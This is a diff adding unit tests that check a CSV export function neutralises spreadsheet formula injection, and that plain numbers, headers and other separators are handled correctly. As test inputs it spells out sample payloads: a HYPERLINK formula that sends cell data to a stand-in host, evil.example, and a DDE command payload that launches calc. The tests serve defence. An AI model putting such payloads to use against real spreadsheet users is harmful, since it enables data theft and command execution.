@@ -47,6 +47,38 @@ describe("exportDelimited", () => {
   });
 });
 
+describe("formula injection", () => {
+  const cell = (value: Value, separator = ",") => exportDelimited([column("a")], [[value]], separator).split("\r\n")[1];
+
+  it("prefixes a cell a spreadsheet would evaluate with a quote and quotes the field", () => {
+    expect(cell(text('=HYPERLINK("http://evil.example/?"&A1,"x")'))).toBe('"\'=HYPERLINK(""http://evil.example/?""&A1,""x"")"');
+    expect(cell(text("-2+3+cmd|' /C calc'!A0"))).toBe("\"'-2+3+cmd|' /C calc'!A0\"");
+    expect(cell(text("+1"))).toBe('"\'+1"');
+    expect(cell(text("@SUM(A1)"))).toBe('"\'@SUM(A1)"');
+    expect(cell(text("\tx"))).toBe('"\'\tx"');
+    expect(cell(text("\rx"))).toBe('"\'\rx"');
+    expect(cell(text("-Infinity"))).toBe('"\'-Infinity"');
+  });
+
+  it("keeps plain numbers, also negative ones, as they are", () => {
+    expect(cell(int(-5))).toBe("-5");
+    expect(cell({ t: "float", v: -1.5e-7 })).toBe("-0.00000015");
+    expect(cell({ t: "decimal", v: "-0.000100" })).toBe("-0.000100");
+    expect(cell(text("-1E+3"))).toBe("-1E+3");
+    expect(cell(text("-1e5"))).toBe("-1e5");
+  });
+
+  it("neutralises headers too, and with any separator", () => {
+    expect(exportDelimited([column("=cmd")], [[int(1)]], ";")).toBe('"\'=cmd"\r\n1');
+    expect(cell(text("=1;2"), ";")).toBe('"\'=1;2"');
+  });
+
+  it("applies to the comma CSV export", () => {
+    expect(exportRows("csv", [column("a")], [[text("=1")]], "t", "ansi")).toBe('a\r\n"\'=1"');
+    expect(parseCsv(exportRows("csv", [column("a")], [[text("=1")]], "t", "ansi"), ",")).toEqual([["a"], ["'=1"]]);
+  });
+});
+
 describe("JSON export", () => {
   it("keeps numbers, booleans, NULL and documents typed", () => {
     const columns = [column("id", "int"), column("ok", "bool"), column("meta", "json"), column("note")];
